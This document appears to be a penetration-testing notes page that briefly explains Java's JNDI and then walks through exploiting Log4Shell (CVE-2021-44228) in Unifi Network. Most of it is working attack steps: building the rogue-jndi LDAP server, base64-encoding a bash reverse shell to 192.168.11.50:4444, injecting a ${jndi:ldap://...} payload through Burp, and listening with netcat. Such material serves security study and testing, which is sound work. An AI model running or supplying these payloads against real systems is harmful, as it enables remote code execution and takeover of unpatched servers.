---
description: Java Naming and Directory Interface
---

# JNDI & Log4Shell

## Basic Information

JNDI, integrated into Java since the late 1990s, serves as a directory service, enabling Java programs to locate data or objects through a naming system. It supports various directory services via service provider interfaces (SPIs), allowing data retrieval from different systems, including remote Java objects. Common SPIs include CORBA COS, Java RMI Registry, and LDAP.

## Exploiting CVE-2021-44228 in Unifi Network

A malicious LDAP server for JNDI injection attacks. The project contains LDAP & HTTP servers for exploiting insecure-by-default Java JNDI API.

```bash
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
```

\*apt install maven

```bash
echo 'bash -c bash -i >&/dev/tcp/192.168.11.50/4444 0>&1' | base64
```

With that Base64 output, build your command in rogue-jndi:

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC4xMS41MC80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "192.168.11.50"
```

Replace the Base64 encoded string after “echo”

**Go to Burpsuit and insert the below code . Place ( Headers, Body, Target, Input )**

```java
${jndi:ldap://192.168.11.50:1389/o=tomcat}
```

\*nc -nvlp 4444

